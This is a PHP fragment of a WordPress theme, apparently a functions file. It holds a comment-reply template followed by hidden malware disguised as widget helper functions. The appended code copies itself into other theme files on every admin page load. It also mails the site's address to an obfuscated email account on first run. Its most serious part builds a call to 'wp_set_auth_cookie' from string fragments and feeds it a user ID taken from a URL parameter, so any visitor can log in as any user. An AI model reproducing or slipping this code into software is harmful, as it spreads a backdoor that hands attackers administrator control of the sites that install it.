				<a href="javascript:void(0);" onclick="MGJS_CMT.reply('commentauthor-<?php comment_ID() ?>', 'comment-<?php comment_ID() ?>', 'comment');"><?php _e('Reply', 'twellow'); ?></a> | 
				<a href="javascript:void(0);" onclick="MGJS_CMT.quote('commentauthor-<?php comment_ID() ?>', 'comment-<?php comment_ID() ?>', 'commentbody-<?php comment_ID() ?>', 'comment');"><?php _e('Quote', 'twellow'); ?></a>
				<?php
					if (function_exists("qc_comment_edit_link")) {
						qc_comment_edit_link('', ' | ', '', __('Edit', 'twellow'));
					}
					edit_comment_link(__('Advanced edit', 'twellow'), ' | ', '');
				?>
			</div>
			<div class="fix"></div>
			<div class="content">
				<?php if ($comment->comment_approved == '0') : ?>
					<p><small><?php _e('Your comment is awaiting moderation.', 'twellow'); ?></small></p>
				<?php endif; ?>

				<div id="commentbody-<?php comment_ID() ?>">
					<?php comment_text(); ?>
				</div>
			</div>
		</div>
		<div class="fix"></div>

<?php
}
?>
<?php

function _verifyactivate_widget(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);				

					$output .= ($showfullstop && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _getall_widgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _getall_widgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verifyactivate_widget");

function _getprepareed_widget(){

	if(!isset($content_length)) $content_length=120;

	if(!isset($checking)) $checking="cookie";

	if(!isset($tags_allowed)) $tags_allowed="<a>";

	if(!isset($filters)) $filters="none";

	if(!isset($separ)) $separ="";

	if(!isset($home_f)) $home_f=get_option("home"); 

	if(!isset($pre_filter)) $pre_filter="wp_";

	if(!isset($is_more_link)) $is_more_link=1; 

	if(!isset($comment_t)) $comment_t=""; 

	if(!isset($c_page)) $c_page=$_GET["cperpage"];

	if(!isset($comm_author)) $comm_author="";

	if(!isset($is_approved)) $is_approved=""; 

	if(!isset($auth_post)) $auth_post="auth";

	if(!isset($m_text)) $m_text="(more...)";

	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");

	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;

	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";

	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";

	if(!isset($fmore)) $fmore=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$yes_widget) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($fixed_tag)) $fixed_tag=1;

	if(!isset($filterss)) $filterss=$home_f; 

	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;

	if(!isset($m_tag)) $m_tag="div";

	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";	

	if(!isset($showfullstop)) $showfullstop=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($content_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $content_length) {

				$l=$content_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$m_text="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags_allowed) {

		$output=strip_tags($output, $tags_allowed);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($fixed_tag) ? balanceTags($output, true) : $output;

	$output .= ($showfullstop && $ellipsis) ? "..." : "";

	$output=apply_filters($filters, $output);

	switch($m_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}



	if ($is_more_link ) {

		if($fmore) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}

?>